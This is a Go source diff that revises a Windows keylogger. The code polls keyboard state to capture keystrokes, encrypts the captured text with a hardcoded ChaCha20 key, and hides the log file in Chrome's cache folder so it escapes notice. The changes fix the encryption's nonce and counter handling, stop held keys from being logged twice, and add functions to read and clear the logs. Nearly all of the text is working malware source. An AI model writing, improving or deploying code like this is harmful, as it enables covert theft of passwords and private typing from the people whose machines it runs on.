@@ -26,7 +26,7 @@ const (
 	mapVK = 2
 )
 
-// 32 bytes key, hardcoded...
+// hardcoded key lol change if u want
 var chachaKey = [32]byte{
 	0x28, 0x38, 0x43, 0x2B, 0xBB, 0x53, 0xD8, 0x82,
 	0x91, 0xA4, 0xC7, 0x6E, 0xF2, 0x35, 0x19, 0x8D,
@@ -39,9 +39,10 @@ type Keylogger struct {
 	logFile      string
 	buffer       strings.Builder
 	sessionNonce [12]byte
+	blockCounter uint64
+	keyPressed   [256]bool
 }
 
-// rlly basic implement
 type chacha20Ctx struct {
 	state [16]uint32
 }
@@ -65,22 +66,21 @@ func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
 func newChaCha20(key *[32]byte, nonce *[12]byte, counter uint64) *chacha20Ctx {
 	ctx := &chacha20Ctx{}
 
-	// constants
+	// chacha constants "expand 32-byte k"
 	ctx.state[0] = 0x61707865
 	ctx.state[1] = 0x3320646e
 	ctx.state[2] = 0x79622d32
 	ctx.state[3] = 0x6b206574
 
-	// Key (256 bits = 8 words)
 	for i := 0; i < 8; i++ {
 		ctx.state[4+i] = binary.LittleEndian.Uint32(key[i*4 : (i+1)*4])
 	}
 
 	ctx.state[12] = uint32(counter)
-	ctx.state[13] = uint32(counter >> 32)
-	ctx.state[14] = binary.LittleEndian.Uint32(nonce[0:4])
-	ctx.state[15] = binary.LittleEndian.Uint32(nonce[4:8])
-	ctx.state[13] |= binary.LittleEndian.Uint32(nonce[8:12]) << 32
+
+	ctx.state[13] = binary.LittleEndian.Uint32(nonce[0:4])
+	ctx.state[14] = binary.LittleEndian.Uint32(nonce[4:8])
+	ctx.state[15] = binary.LittleEndian.Uint32(nonce[8:12])
 
 	return ctx
 }
@@ -89,15 +89,13 @@ func (ctx *chacha20Ctx) getKeystream() [64]byte {
 	workingState := ctx.state
 	var keystream [64]byte
 
-	// 20 rounds (10 double rounds)
+	// 20 rounds
 	for i := 0; i < 10; i++ {
-		// Column rounds
 		workingState[0], workingState[4], workingState[8], workingState[12] = quarterRound(workingState[0], workingState[4], workingState[8], workingState[12])
 		workingState[1], workingState[5], workingState[9], workingState[13] = quarterRound(workingState[1], workingState[5], workingState[9], workingState[13])
 		workingState[2], workingState[6], workingState[10], workingState[14] = quarterRound(workingState[2], workingState[6], workingState[10], workingState[14])
 		workingState[3], workingState[7], workingState[11], workingState[15] = quarterRound(workingState[3], workingState[7], workingState[11], workingState[15])
 
-		// Diagonal rounds
 		workingState[0], workingState[5], workingState[10], workingState[15] = quarterRound(workingState[0], workingState[5], workingState[10], workingState[15])
 		workingState[1], workingState[6], workingState[11], workingState[12] = quarterRound(workingState[1], workingState[6], workingState[11], workingState[12])
 		workingState[2], workingState[7], workingState[8], workingState[13] = quarterRound(workingState[2], workingState[7], workingState[8], workingState[13])
@@ -115,9 +113,9 @@ func (ctx *chacha20Ctx) getKeystream() [64]byte {
 	return keystream
 }
 
-func chacha20Encrypt(key *[32]byte, nonce *[12]byte, plaintext []byte) []byte {
+func chacha20Encrypt(key *[32]byte, nonce *[12]byte, plaintext []byte, startCounter uint64) []byte {
 	ciphertext := make([]byte, len(plaintext))
-	counter := uint64(0)
+	counter := startCounter
 
 	for i := 0; i < len(plaintext); i += 64 {
 		ctx := newChaCha20(key, nonce, counter)
@@ -138,9 +136,9 @@ func chacha20Encrypt(key *[32]byte, nonce *[12]byte, plaintext []byte) []byte {
 	return ciphertext
 }
 
-func chacha20Decrypt(key *[32]byte, nonce *[12]byte, ciphertext []byte) []byte {
-	// encrypt == decrypt
-	return chacha20Encrypt(key, nonce, ciphertext)
+func chacha20Decrypt(key *[32]byte, nonce *[12]byte, ciphertext []byte, startCounter uint64) []byte {
+	// encrypt and decrypt are the same
+	return chacha20Encrypt(key, nonce, ciphertext, startCounter)
 }
 
 func NewKeylogger() *Keylogger {
@@ -149,33 +147,31 @@ func NewKeylogger() *Keylogger {
 		appData = os.TempDir()
 	}
 
+	// hide in chrome cache lmao
 	logFile := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Cache", "data_0")
 
 	return &Keylogger{
-		logFile: logFile,
-		running: false,
+		logFile:      logFile,
+		running:      false,
+		blockCounter: 0,
 	}
 }
 
-// GetAsyncKeyState wrapper
 func GetAsyncKeyState(vKey int) bool {
 	ret, _, _ := getAsyncKeyState.Call(uintptr(vKey))
 	return ret&0x8000 != 0
 }
 
-// GetKeyboardState wrapper
 func GetKeyboardState(lpKeyState *[256]byte) bool {
 	ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
 	return ret != 0
 }
 
-// MapVirtualKey wrapper
 func MapVirtualKey(uCode uint, uMapType uint) uint {
 	ret, _, _ := mapVirtualKey.Call(uintptr(uCode), uintptr(uMapType))
 	return uint(ret)
 }
 
-// ToUnicode wrapper
 func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
 	ret, _, _ := toUnicode.Call(
 		uintptr(wVirtKey),
@@ -196,41 +192,73 @@ func (kl *Keylogger) Start() string {
 	dir := filepath.Dir(kl.logFile)
 	os.MkdirAll(dir, 0755)
 
-	_, err := rand.Read(kl.sessionNonce[:])
-	if err != nil {
-		return fmt.Sprintf("❌ Error generating nonce: %v", err)
-	}
-
+	// check if we got an existing file
 	fileInfo, err := os.Stat(kl.logFile)
 	isNewFile := os.IsNotExist(err) || (fileInfo != nil && fileInfo.Size() == 0)
 
-	file, err := os.OpenFile(kl.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return fmt.Sprintf("❌ Error creating log file: %v", err)
-	}
-
 	if isNewFile {
+		_, err := rand.Read(kl.sessionNonce[:])
+		if err != nil {
+			return fmt.Sprintf("❌ Error generating nonce: %v", err)
+		}
+		kl.blockCounter = 0
+
+		// write nonce header to file
+		file, err := os.OpenFile(kl.logFile, os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			return fmt.Sprintf("❌ Error creating log file: %v", err)
+		}
 		file.Write(kl.sessionNonce[:])
 		file.Write([]byte{0x0A})
+		file.Close()
+	} else {
+		// file exists, load nonce and calc counter
+		content, err := os.ReadFile(kl.logFile)
+		if err != nil {
+			return fmt.Sprintf("❌ Error reading log file: %v", err)
+		}
+
+		if len(content) < 13 {
+			return "❌ Corrupted log file"
+		}
+
+		// reuse same nonce from file
+		copy(kl.sessionNonce[:], content[:12])
+
+		// count how many blocks we already used
+		content = content[13:]
+		blockCount := uint64(0)
+		offset := 0
+		for offset < len(content) {
+			if offset+4 > len(content) {
+				break
+			}
+			length := binary.LittleEndian.Uint32(content[offset : offset+4])
+			offset += 4
+			if offset+int(length) > len(content) {
+				break
+			}
+			blockCount += (uint64(length) + 63) / 64
+			offset += int(length)
+		}
+		kl.blockCounter = blockCount
 	}
-	file.Close()
 
 	kl.running = true
-
 	go kl.keyloggerLoop()
 
-	return "🔑 Keylogger started successfully"
+	return "keylogger started successfully"
 }
 
 func (kl *Keylogger) Stop() string {
 	if !kl.running {
-		return "⚠ Keylogger not running"
+		return "⚠ keylogger not running"
 	}
 
 	kl.running = false
 	kl.flushBuffer()
 
-	return "✅ Keylogger stopped"
+	return "keylogger stopped"
 }
 
 func (kl *Keylogger) keyloggerLoop() {
@@ -243,7 +271,15 @@ func (kl *Keylogger) keyloggerLoop() {
 				return
 			}
 
+			// check if key currently pressed
 			if GetAsyncKeyState(ascii) {
+				if kl.keyPressed[ascii] {
+					continue
+				}
+
+				// mark as pressed so we dont double log
+				kl.keyPressed[ascii] = true
+
 				if !GetKeyboardState(&keyState) {
 					continue
 				}
@@ -257,37 +293,38 @@ func (kl *Keylogger) keyloggerLoop() {
 					kl.processKeystroke(text, ascii)
 				}
 
-				time.Sleep(40 * time.Millisecond)
+				time.Sleep(10 * time.Millisecond)
+			} else {
+				kl.keyPressed[ascii] = false
 			}
 		}
-		time.Sleep(40 * time.Millisecond)
+		time.Sleep(10 * time.Millisecond)
 	}
 }
 
 func (kl *Keylogger) processKeystroke(text string, keyCode int) {
 	switch keyCode {
-	case 8: // Backspace
+	case 8:
 		kl.buffer.WriteString("[BACKSPACE]")
-	case 9: // Tab
+	case 9:
 		kl.buffer.WriteString("[TAB]")
-	case 13: // Enter
+	case 13:
 		kl.buffer.WriteString("[ENTER]\n")
-	case 32: // Space
+	case 32:
 		kl.buffer.WriteString(" ")
-	case 37: // Left arrow
+	case 37:
 		kl.buffer.WriteString("[LEFT]")
-	case 38: // Up arrow
+	case 38:
 		kl.buffer.WriteString("[UP]")
-	case 39: // Right arrow
+	case 39:
 		kl.buffer.WriteString("[RIGHT]")
-	case 40: // Down arrow
+	case 40:
 		kl.buffer.WriteString("[DOWN]")
-	case 46: // Delete
+	case 46:
 		kl.buffer.WriteString("[DEL]")
-	case 20: // Caps Lock
+	case 20:
 		kl.buffer.WriteString("[CAPS]")
-	case 16, 17, 18: // Shift, Ctrl, Alt
-    
+	case 16, 17, 18:
 		return
 	default:
 		kl.buffer.WriteString(text)
@@ -306,10 +343,12 @@ func (kl *Keylogger) flushBuffer() {
 	content := kl.buffer.String()
 	kl.buffer.Reset()
 
-	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	timestamp := time.Now().Format("1991-25-12 15:04:05") // lol
 	logEntry := fmt.Sprintf("[%s] %s", timestamp, content)
 
-	encrypted := chacha20Encrypt(&chachaKey, &kl.sessionNonce, []byte(logEntry))
+	encrypted := chacha20Encrypt(&chachaKey, &kl.sessionNonce, []byte(logEntry), kl.blockCounter)
+	blocksUsed := (uint64(len(logEntry)) + 63) / 64
+	kl.blockCounter += blocksUsed
 
 	file, err := os.OpenFile(kl.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -326,23 +365,25 @@ func (kl *Keylogger) flushBuffer() {
 }
 
 func (kl *Keylogger) GetLogs() (string, error) {
-	kl.flushBuffer() 
+	kl.flushBuffer()
 
 	content, err := os.ReadFile(kl.logFile)
 	if err != nil {
 		return "", err
 	}
 
-	if len(content) < 13 { 
+	if len(content) < 13 {
 		return "", fmt.Errorf("empty log")
 	}
 
+	// read nonce from header
 	var fileNonce [12]byte
 	copy(fileNonce[:], content[:12])
 
 	content = content[13:]
 
 	var decryptedLogs strings.Builder
+	blockCounter := uint64(0)
 
 	offset := 0
 	for offset < len(content) {
@@ -350,15 +391,20 @@ func (kl *Keylogger) GetLogs() (string, error) {
 			break
 		}
 
+		// read length prefix
 		length := binary.LittleEndian.Uint32(content[offset : offset+4])
 		offset += 4
 
 		if offset+int(length) > len(content) {
 			break
 		}
-    
+
 		encrypted := content[offset : offset+int(length)]
-		decrypted := chacha20Decrypt(&chachaKey, &fileNonce, encrypted)
+
+		// decrypt with proper counter
+		decrypted := chacha20Decrypt(&chachaKey, &fileNonce, encrypted, blockCounter)
+		blocksUsed := (uint64(length) + 63) / 64
+		blockCounter += blocksUsed
 
 		decryptedLogs.WriteString(string(decrypted))
 		decryptedLogs.WriteString("\n")
@@ -371,6 +417,7 @@ func (kl *Keylogger) GetLogs() (string, error) {
 
 func (kl *Keylogger) ClearLogs() error {
 	kl.buffer.Reset()
+	kl.blockCounter = 0
 	return os.Remove(kl.logFile)
 }
 
